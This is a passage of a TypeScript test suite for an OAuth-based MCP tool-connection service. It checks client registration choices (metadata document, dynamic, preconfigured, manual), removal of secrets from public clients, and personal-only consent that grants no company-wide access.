        message: expect.stringContaining("membership no longer permits connection changes"),
      });

      const [connection] = await db.select().from(toolConnections).where(eq(
        toolConnections.id,
        connected.connectionId,
      ));
      expect(connection).toMatchObject({ status: "draft" });
      expect(connection!.credentialSecretRefs).toEqual([]);
      await expect(db.select().from(companySecrets).where(eq(companySecrets.companyId, company.id)))
        .resolves.toHaveLength(beforeSecrets.length);
      await expect(db.select().from(companySecretVersions)).resolves.toHaveLength(beforeVersions.length);
      await expect(db.select().from(companySecretBindings).where(eq(companySecretBindings.companyId, company.id)))
        .resolves.toHaveLength(beforeBindings.length);
      const afterGrants = await db.select().from(connectionGrants).where(and(
        eq(connectionGrants.companyId, company.id),
        eq(connectionGrants.connectionId, connected.connectionId),
      ));
      expect(afterGrants).toEqual(beforeGrants);
    } finally {
      releaseRemoval();
      await removal.catch(() => undefined);
      await callbackDb.$client.end({ timeout: 0 }).catch(() => undefined);
      await removalDb.$client.end({ timeout: 0 }).catch(() => undefined);
    }
  }, 15_000);

  it("discovers a pathful issuer through the OIDC suffix form too", async () => {
    installMcpOAuthFixture({ auth: "oauth", wellKnownStyle: "oidc-suffix" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture suffix" });
    expect(connected.auth).toMatchObject({ kind: "oauth", issuer: ISSUER });
  });

  it("prefers a Client ID Metadata Document over dynamic registration", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    const company = await createCompany(db);
    const service = toolAccessService(db, {
      oauthClientMetadataLookup: async () => [{ address: "93.184.216.34", family: 4 }],
    });

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture CIMD" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("cimd");
    // The client_id *is* the document URL, so nothing was registered.
    expect(new URL(start.authorizationUrl).searchParams.get("client_id")).toBe(CLIENT_METADATA_DOCUMENT_URL);
    expect(fixture.requestsTo("/register")).toHaveLength(0);
  });

  it("replaces a private-only Client ID Metadata Document with dynamic registration", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      cimd: true,
      registrationExtraRedirectUris: [`${ISSUER}/oauth/callback/`],
    });
    const company = await createCompany(db);
    let metadataAddress = "93.184.216.34";
    const service = toolAccessService(db, {
      oauthClientMetadataLookup: async () => [{ address: metadataAddress, family: 4 }],
    });

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture private CIMD" });
    const firstStart = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://paperclip.tailnet.test:42001/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(firstStart.registrationSource).toBe("cimd");

    // A private DNS answer models a Tailscale/MagicDNS callback. The first start
    // also proves retry migration: a connection that persisted the now-unusable
    // CIMD client id must not keep presenting it forever.
    metadataAddress = "100.100.100.100";
    const retry = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://paperclip.tailnet.test:42001/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(retry.registrationSource).toBe("dcr");
    expect(new URL(retry.authorizationUrl).searchParams.get("client_id")).toBe("fixture-dcr-client");
    expect(fixture.requestsTo("/register")).toHaveLength(1);
  });

  it("falls back to dynamic registration when the callback is not public HTTPS", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture local CIMD" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      // A loopback callback cannot serve a client_id an authorization server can
      // fetch, so CIMD is unavailable and DCR has to carry the flow.
      redirectUri: "http://localhost:3100/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("dcr");
    expect(fixture.requestsTo("/register")).toHaveLength(1);
  });

  // TECH-7973: the prod origin is https://rh-agents.drum-mackarel.ts.net — a
  // tailnet name with no public DNS record. CIMD used to be adopted anyway
  // (a *.ts.net name is not literally a private IP, and a DNS failure was
  // treated as "inconclusive"), handing Granola a client_id it could never
  // fetch, which surfaces as invalid_client after the user has consented.
  it("uses DCR for a privately resolved tailnet callback origin", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    const company = await createCompany(db);
    const lookup = vi.fn(async () => [{ address: "100.100.100.100", family: 4 }]);
    const service = toolAccessService(db, { oauthClientMetadataLookup: lookup });

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture tailnet CIMD",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://rh-agents.drum-mackarel.ts.net/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("dcr");
    expect(new URL(start.authorizationUrl).searchParams.get("client_id")).toBe("fixture-dcr-client");
    expect(fixture.requestsTo("/register")).toHaveLength(1);
    expect(lookup).toHaveBeenCalled();
  });

  it("keeps CIMD for a publicly resolved Tailscale Funnel callback", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    const company = await createCompany(db);
    const service = toolAccessService(db, {
      oauthClientMetadataLookup: async () => [{ address: "93.184.216.34", family: 4 }],
    });
    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL, name: "Fixture public Funnel CIMD",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://paperclip.example.ts.net/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(start.registrationSource).toBe("cimd");
    expect(new URL(start.authorizationUrl).searchParams.get("client_id"))
      .toBe("https://paperclip.example.ts.net/api/tools/oauth/client-metadata");
    expect(fixture.requestsTo("/register")).toHaveLength(0);
  });

  it("replaces cached CIMD material when the callback hostname no longer resolves publicly", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    const company = await createCompany(db);
    let resolution: "public" | "nxdomain" = "public";
    const service = toolAccessService(db, {
      oauthClientMetadataLookup: async () => {
        if (resolution === "nxdomain") {
          throw Object.assign(new Error("ENOTFOUND"), { code: "ENOTFOUND" });
        }
        return [{ address: "93.184.216.34", family: 4 }];
      },
    });

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture CIMD nxdomain",
    });
    const redirectUri = "https://paperclip.example:42001/api/tools/oauth/callback";
    const first = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri,
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(first.registrationSource).toBe("cimd");

    // The stored CIMD client id must be invalidated the same way a private
    // answer always has been: a later run that cannot prove public resolution
    // re-registers instead of replaying the old client id.
    resolution = "nxdomain";
    const retry = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri,
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(retry.registrationSource).toBe("dcr");
    expect(new URL(retry.authorizationUrl).searchParams.get("client_id")).toBe("fixture-dcr-client");
    expect(fixture.requestsTo("/register")).toHaveLength(1);
  });

  it("prefers a deployment-preconfigured client over any registration", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", cimd: true });
    vi.stubEnv("PAPERCLIP_TOOL_OAUTH_CLIENT_ID", "preconfigured-client");
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture preconfigured" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("preconfigured");
    expect(new URL(start.authorizationUrl).searchParams.get("client_id")).toBe("preconfigured-client");
    expect(fixture.requestsTo("/register")).toHaveLength(0);
  });

  it("asks for a preregistered client when the server offers neither CIMD nor DCR", async () => {
    installMcpOAuthFixture({ auth: "oauth", dcr: false });
    const company = await createCompany(db);
    const app = createRouteApp(db);
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({ link: MCP_URL, name: "Fixture manual" })
      .expect(201);

    // The draft connection is real; only the client is missing. Losing the draft
    // here would make the operator start over just to paste a client id.
    expect(response.body.auth).toMatchObject({ kind: "oauth", startUrl: null, manualClientRequired: true });
    await expect(db.select().from(toolConnections)).resolves.toHaveLength(1);
  });

  it("uses preregistered client credentials without registering anything", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", dcr: false });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture manual client",
      authMode: "oauth",
      oauthClient: { clientId: "operator-client", clientSecret: "operator-secret" },
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    expect(start.registrationSource).toBe("manual");
    expect(new URL(start.authorizationUrl).searchParams.get("client_id")).toBe("operator-client");
    expect(fixture.requestsTo("/register")).toHaveLength(0);

    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    // The client secret is a secret ref, and specifically *not* a credential ref:
    // it goes to the token endpoint, never onto an MCP request as a header.
    expect(connection!.credentialSecretRefs.some((ref) => ref.configPath === "oauth.client_secret")).toBe(true);
    expect(connection!.credentialRefs.some((ref) => ref.name === "oauth.client_secret")).toBe(false);
    expect(JSON.stringify(connection!.config)).not.toContain("operator-secret");

    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBe("operator-secret");
  });

  /**
   * TECH-7973: Granola's authorization server advertises `none` and has no DCR
   * endpoint, so the flow needs a manually entered public client. Setup forms
   * never receive a stored secret, so "save the same client id with a blank
   * secret" has to keep meaning "keep the saved secret" for existing
   * confidential clients. A public client therefore has to be stated.
   */
  it("treats a manual client saved as public as having no secret", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      dcr: false,
      tokenEndpointAuthMethods: ["none"],
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    // Step 1: the same client id was first stored with a secret (the stale
    // state that produced invalid_client against Granola).
    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture manual public",
      authMode: "oauth",
      oauthClient: { clientId: "operator-client", clientSecret: "stale-secret" },
    });
    const [beforeFix] = await db
      .select()
      .from(toolConnections)
      .where(eq(toolConnections.id, connected.connectionId));
    expect(
      beforeFix!.credentialSecretRefs.some(
        (ref) => ref.configPath === "oauth.client_secret",
      ),
    ).toBe(true);

    // Step 2: the operator re-saves the same client id and states it is public.
    const resaved = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture manual public",
      resumeConnectionId: connected.connectionId,
      authMode: "oauth",
      oauthClient: { clientId: "operator-client", publicClient: true },
    });
    const [connection] = await db
      .select()
      .from(toolConnections)
      .where(eq(toolConnections.id, resaved.connectionId));

    // The retained secret ref is gone, and the persisted method is `none` so a
    // later refresh cannot silently fall back to client_secret_post.
    expect(
      connection!.credentialSecretRefs.some(
        (ref) => ref.configPath === "oauth.client_secret",
      ),
    ).toBe(false);
    expect(connection!.config).toMatchObject({
      oauth: {
        clientId: "operator-client",
        clientRegistrationSource: "manual",
        clientTokenEndpointAuthMethod: "none",
      },
    });

    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });
    expect(start.registrationSource).toBe("manual");
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor,
    });

    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBeNull();
    expect((tokenRequest.body as URLSearchParams).get("client_id")).toBe("operator-client");
    expect(tokenRequest.headers.authorization).toBeUndefined();
  });

  it("drops a per-user grant's stale client secret when the manual client becomes public", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      dcr: false,
      tokenEndpointAuthMethods: ["none"],
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    // A personal ("Just me") manual client whose secret lives on the user grant.
    const connected = await service.connectGalleryApp(
      company.id,
      {
        link: MCP_URL,
        name: "Fixture personal manual public",
        grantKind: "user",
        authMode: "oauth",
        oauthClient: { clientId: "operator-client", clientSecret: "stale-secret" },
      },
      actor,
    );
    const grantRefs = async () =>
      (
        await db
          .select()
          .from(connectionGrants)
          .where(eq(connectionGrants.connectionId, connected.connectionId))
      ).flatMap((grant) => grant.credentialSecretRefs);

    // The secret went to the grant, not the connection row.
    expect(await grantRefs()).toEqual([
      expect.objectContaining({ configPath: "oauth.client_secret" }),
    ]);

    await service.connectGalleryApp(
      company.id,
      {
        link: MCP_URL,
        name: "Fixture personal manual public",
        resumeConnectionId: connected.connectionId,
        authMode: "oauth",
        oauthClient: { clientId: "operator-client", publicClient: true },
      },
      actor,
    );

    // TECH-7973: `oauthClientForConnection` used to fall back to this grant
    // secret for a manual client, re-defaulting the exchange to
    // client_secret_post. The public claim has to remove it, not just ignore it.
    expect(
      (await grantRefs()).some(
        (ref) => ref.configPath === "oauth.client_secret",
      ),
    ).toBe(false);

    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor,
    });
    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBeNull();
  });

  it("rejects a public client that also carries a secret", async () => {
    installMcpOAuthFixture({ auth: "oauth", dcr: false });
    const company = await createCompany(db);
    const app = createRouteApp(db);
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);

    await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({
        link: MCP_URL,
        name: "Fixture contradictory client",
        authMode: "oauth",
        oauthClient: {
          clientId: "operator-client",
          clientSecret: "operator-secret",
          publicClient: true,
        },
      })
      .expect(400);
  });

  // ---- TECH-7276: personal rh-mcp template, RH-shaped discovery and first-consent defaults ------

  const RH_MCP_TOOLS = [
    "mdm_granola_status",
    "mdm_list_my_granola_notes",
    "mdm_list_shared_granola_notes",
    "mdm_get_granola_note",
    "mdm_get_granola_transcript",
    "mdm_erase_granola_note",
    "mdm_disconnect_granola",
  ].map((name) => ({ name, description: name, annotations: { readOnlyHint: true } }));

  /** Connects `name` as a personal URL connection, optionally tags it as the rh-mcp template, and consents once. */
  async function consentPersonal(
    companyId: string,
    name: string,
    opts: { tag: boolean; fixture: ReturnType<typeof installMcpOAuthFixture> },
  ) {
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const connected = await service.connectGalleryApp(companyId, { link: MCP_URL, name, grantKind: "user" }, actor);
    if (opts.tag) {
      // The operator's connection config (identity model + entry tag); never part of the consent flow itself.
      const [row] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
      const config = { ...row!.config, identityModel: "personal_only", paperclipDefaultMcpEntry: "rh-mcp" };
      await db.update(toolConnections).set({ config, transportConfig: config }).where(eq(toolConnections.id, row!.id));
    }
    const start = await service.startOAuth(companyId, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
    const code = opts.fixture.issueAuthorizationCode(start.authorizationUrl);
    const result = await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor,
    });
    return { service, connectionId: connected.connectionId, result };
  }

  it("TECH-7276: first consent on the tagged personal template creates no company install or binding; a plain personal connection keeps the generic default", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", tools: RH_MCP_TOOLS });
    const company = await createCompany(db);
    const [legacyAgent] = await db.insert(agents).values({
      companyId: company.id, name: "Legacy", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {},
    }).returning();

    const tagged = await consentPersonal(company.id, "rh-mcp-personal", { tag: true, fixture });
    // Nothing is turned on for anyone: no company install, no agent install, no binding of any target.
    expect(await db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.connectionId, tagged.connectionId))).toHaveLength(0);
    const [taggedProfile] = await db.select().from(toolProfiles).where(and(eq(toolProfiles.companyId, company.id), eq(toolProfiles.profileKey, `app:${tagged.connectionId}`)));
    expect(taggedProfile).toBeTruthy();
    expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.profileId, taggedProfile!.id))).toHaveLength(0);
    // The curated profile permits every discovered action by catalog entry id (the existing app profile shape).
    const taggedCatalog = await db.select().from(toolCatalogEntries).where(eq(toolCatalogEntries.connectionId, tagged.connectionId));
    const taggedEntries = await db.select().from(toolProfileEntries).where(eq(toolProfileEntries.profileId, taggedProfile!.id));
    expect(taggedCatalog.map((entry) => entry.toolName).sort()).toEqual(RH_MCP_TOOLS.map((tool) => tool.name).sort());
    expect(taggedEntries.map((entry) => [entry.selectorType, entry.catalogEntryId]).sort()).toEqual(
      taggedCatalog.map((entry) => ["catalog_entry", entry.id]).sort(),
    );
    // The consenting user's own grant is the only credential; the legacy agent gains nothing.
    expect(await db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, tagged.connectionId))).toEqual([
      expect.objectContaining({ kind: "user", subjectUserId: "board-user" }),
    ]);
    const legacyEffective = await tagged.service.getEffectiveProfilesForAgent(company.id, legacyAgent!.id);
    expect(legacyEffective.installedConnections.map((connection) => connection.id)).not.toContain(tagged.connectionId);
    expect(legacyEffective.allowedTools).toHaveLength(0);

    // Re-consent (a later reauthorization) keeps an explicit per-agent install, and adds no company-wide one.
    await tagged.service.putConnectionInstalls(tagged.connectionId, { installs: [{ targetType: "agent", targetId: legacyAgent!.id }] });
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const restart = await tagged.service.startOAuth(company.id, tagged.connectionId, { redirectUri: REDIRECT_URI, actor });
    await tagged.service.completeOAuthCallback({
      state: new URL(restart.authorizationUrl).searchParams.get("state")!,
      code: fixture.issueAuthorizationCode(restart.authorizationUrl),
      redirectUri: REDIRECT_URI,
      actor,
    });
    const reinstalls = await db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.connectionId, tagged.connectionId));
    expect(reinstalls.map((install) => [install.targetType, install.targetId])).toEqual([["agent", legacyAgent!.id]]);
    const rebindings = await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.profileId, taggedProfile!.id));
    expect(rebindings.map((binding) => binding.targetType)).not.toContain("company");

    // Control: the same flow for an ordinary personal connection still gets the generic company default.
    const plain = await consentPersonal(company.id, "Plain personal", { tag: false, fixture });
    const plainInstalls = await db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.connectionId, plain.connectionId));
    expect(plainInstalls.map((install) => install.targetType)).toEqual(["company"]);
  });

  it("TECH-7276: the explicit access decision never shares the personal template with the company or installs it company-wide", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", tools: RH_MCP_TOOLS });
    const company = await createCompany(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const tagged = await consentPersonal(company.id, "rh-mcp-personal", { tag: true, fixture });
    const grantsBefore = await db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, tagged.connectionId));

    await expect(
      tagged.service.finalizeOAuthAccess(company.id, tagged.connectionId, { grantKind: "organization" }, actor),
    ).rejects.toMatchObject({ status: 400 });
    expect(await db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, tagged.connectionId))).toHaveLength(grantsBefore.length);

    await tagged.service.finalizeOAuthAccess(company.id, tagged.connectionId, { grantKind: "user" }, actor);
    expect(await db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.connectionId, tagged.connectionId))).toHaveLength(0);
    const [profile] = await db.select().from(toolProfiles).where(and(eq(toolProfiles.companyId, company.id), eq(toolProfiles.profileKey, `app:${tagged.connectionId}`)));
    expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.profileId, profile!.id))).toHaveLength(0);
    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, tagged.connectionId));
    expect(connection).toMatchObject({ credentialPolicy: "per_user", authKind: "oauth" });

    // An ordinary connection keeps the existing choice (here: a personal "Just me" with the generic company default).
    const plain = await consentPersonal(company.id, "Plain personal", { tag: false, fixture });
    await plain.service.finalizeOAuthAccess(company.id, plain.connectionId, { grantKind: "user" }, actor);
    const plainInstalls = await db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.connectionId, plain.connectionId));
    expect(plainInstalls.map((install) => install.targetType)).toEqual(["company"]);
  });

  it("TECH-7276: reconsent with an existing legacy company install preserves per-agent bindings, creates no company binding, and retains the company install row", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", tools: RH_MCP_TOOLS });
    const company = await createCompany(db);
    const [agentA] = await db.insert(agents).values({
      companyId: company.id, name: "Agent A", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {},
    }).returning();
    const [agentB] = await db.insert(agents).values({
      companyId: company.id, name: "Agent B", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {},
    }).returning();

    // Tagged personal consent
    const tagged = await consentPersonal(company.id, "rh-mcp-personal", { tag: true, fixture });

    // putConnectionInstalls A -> creates agent install + agent binding
    await tagged.service.putConnectionInstalls(tagged.connectionId, {
      installs: [{ targetType: "agent", targetId: agentA!.id }],
    });

    // Direct insert legacy company install WITHOUT binding
    await db.insert(toolConnectionInstalls).values({
      companyId: company.id,
      connectionId: tagged.connectionId,
      targetType: "company",
      targetId: company.id,
    });

    // Reconsent start / callback
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const restart = await tagged.service.startOAuth(company.id, tagged.connectionId, { redirectUri: REDIRECT_URI, actor });
    await tagged.service.completeOAuthCallback({
      state: new URL(restart.authorizationUrl).searchParams.get("state")!,
      code: fixture.issueAuthorizationCode(restart.authorizationUrl),
      redirectUri: REDIRECT_URI,
      actor,
    });

    // Exact install set company + A retained
    const reinstalls = await db
      .select()
      .from(toolConnectionInstalls)
      .where(eq(toolConnectionInstalls.connectionId, tagged.connectionId));
    expect(reinstalls.map((install) => [install.targetType, install.targetId]).sort()).toEqual([
      ["agent", agentA!.id],
      ["company", company.id],
    ].sort());

    // Binding ONLY A no company
    const [taggedProfile] = await db
      .select()
      .from(toolProfiles)
      .where(and(eq(toolProfiles.companyId, company.id), eq(toolProfiles.profileKey, `app:${tagged.connectionId}`)));
    const rebindings = await db
      .select()
      .from(toolProfileBindings)
      .where(eq(toolProfileBindings.profileId, taggedProfile!.id));
    expect(rebindings.map((b) => [b.targetType, b.targetId])).toEqual([["agent", agentA!.id]]);

    // Only user grant
    const grants = await db
      .select()
      .from(connectionGrants)
      .where(eq(connectionGrants.connectionId, tagged.connectionId));
    expect(grants).toEqual([
      expect.objectContaining({ kind: "user", subjectUserId: "board-user" }),
    ]);

    // Uninstalled B effective allowedTools 0
    const bEffective = await tagged.service.getEffectiveProfilesForAgent(company.id, agentB!.id);
    expect(bEffective.allowedTools).toHaveLength(0);
  });

  it("TECH-7276: completing OAuth with stale org-level state on a personal default template fails 400 and leaves all connection state unchanged", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", tools: RH_MCP_TOOLS });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    // Connect as org gallery app (prevalid, untagged)
    const connected = await service.connectGalleryApp(
      company.id,
      { link: MCP_URL, name: "rh-mcp-personal", grantKind: "organization" },
      actor,
    );
    // Mint org-level state before tagging (subjectUserId is null)
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });

    // Operator updates connection in DB: per_user + personal_only + tag within 10 min
    const [row] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    const config = { ...row!.config, identityModel: "personal_only", paperclipDefaultMcpEntry: "rh-mcp" };
    await db
      .update(toolConnections)
      .set({ credentialPolicy: "per_user", config, transportConfig: config })
      .where(eq(toolConnections.id, row!.id));

    // Snapshots before callback
    const grantsBefore = await db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, connected.connectionId));
    const secretsBefore = await db.select().from(companySecrets).where(eq(companySecrets.companyId, company.id));
    const secretVersionsBefore = await db.select().from(companySecretVersions);
    const profilesBefore = await db.select().from(toolProfiles).where(eq(toolProfiles.companyId, company.id));
    const bindingsBefore = await db.select().from(toolProfileBindings);
    const installsBefore = await db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.connectionId, connected.connectionId));
    const [connBefore] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    const tokenRequestsBefore = fixture.requestsTo("/token").length;

    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await expect(
      service.completeOAuthCallback({
        state: new URL(start.authorizationUrl).searchParams.get("state")!,
        code,
        redirectUri: REDIRECT_URI,
        actor,
      }),
    ).rejects.toMatchObject({
      status: 400,
      details: { code: "personal_default_mcp_requires_personal_grant" },
      message: "This connection is personal-only and cannot use a shared company identity",
    });

    // All snapshots UNCHANGED
    const grantsAfter = await db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, connected.connectionId));
    expect(grantsAfter).toEqual(grantsBefore);
    const secretsAfter = await db.select().from(companySecrets).where(eq(companySecrets.companyId, company.id));
    expect(secretsAfter).toEqual(secretsBefore);
    const secretVersionsAfter = await db.select().from(companySecretVersions);
    expect(secretVersionsAfter).toEqual(secretVersionsBefore);
    const profilesAfter = await db.select().from(toolProfiles).where(eq(toolProfiles.companyId, company.id));
    expect(profilesAfter).toEqual(profilesBefore);
    const bindingsAfter = await db.select().from(toolProfileBindings);
    expect(bindingsAfter).toEqual(bindingsBefore);
    const installsAfter = await db.select().from(toolConnectionInstalls).where(eq(toolConnectionInstalls.connectionId, connected.connectionId));
    expect(installsAfter).toEqual(installsBefore);

    const [connAfter] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    expect(connAfter!.credentialSecretRefs).toEqual(connBefore!.credentialSecretRefs);
    expect(connAfter!.status).toBe(connBefore!.status);

    expect(fixture.requestsTo("/token")).toHaveLength(tokenRequestsBefore);
  });

  it("TECH-7276: an RH MCP-shaped authorization server (DCR + S256, confidential methods, no CIMD) registers dynamically and never uses a client-metadata document", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      dcr: true,
      cimd: false,
      tokenEndpointAuthMethods: ["client_secret_post", "client_secret_basic"],
      tools: RH_MCP_TOOLS,
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "rh-mcp-personal", grantKind: "user" }, actor);
    expect(connected.auth).toMatchObject({ kind: "oauth", issuer: ISSUER, resource: MCP_URL });
    const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });

    expect(start.registrationSource).toBe("dcr");
    expect(fixture.requestsTo("/register")).toHaveLength(1);
    expect(fixture.requestsTo("/register")[0]!.method).toBe("POST");
    expect(fixture.requestsTo("/register")[0]!.body).toMatchObject({ redirect_uris: [REDIRECT_URI], application_type: "web" });
    const authorizationUrl = new URL(start.authorizationUrl);
    expect(authorizationUrl.searchParams.get("client_id")).toBe("fixture-dcr-client");
    expect(authorizationUrl.searchParams.get("code_challenge_method")).toBe("S256");
    // No client-metadata-document client id was ever presented, and its URL was never fetched or advertised.
    expect(authorizationUrl.searchParams.get("client_id")).not.toBe(CLIENT_METADATA_DOCUMENT_URL);
    expect(fixture.requests.some((entry) => entry.url.includes("client-metadata"))).toBe(false);
    // The confidential method it registered for is the one the token exchange authenticates with.
    const registeredMethod = (fixture.requestsTo("/register")[0]!.body as Record<string, unknown>).token_endpoint_auth_method;
    expect(["client_secret_post", "client_secret_basic"]).toContain(registeredMethod);
    await service.completeOAuthCallback({
      state: authorizationUrl.searchParams.get("state")!,
      code: fixture.issueAuthorizationCode(start.authorizationUrl),
      redirectUri: REDIRECT_URI,
      actor,
    });
    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    if (registeredMethod === "client_secret_basic") expect(tokenRequest.headers.authorization).toMatch(/^Basic /);
    else expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBe("fixture-dcr-secret");
  });

  it("uses a preregistered client secret stored on a personal user grant", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth", dcr: false });
    const company = await createCompany(db);
    await db
      .update(companyMemberships)
      .set({ membershipRole: "owner" })
      .where(eq(companyMemberships.companyId, company.id));
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture personal manual client",
      authMode: "oauth",
      grantKind: "user",
      oauthClient: { clientId: "operator-client", clientSecret: "operator-secret" },
    }, { actorType: "user", actorId: "board-user" });
    const [storedConnection] = await db.select().from(toolConnections)
      .where(eq(toolConnections.id, connected.connectionId));
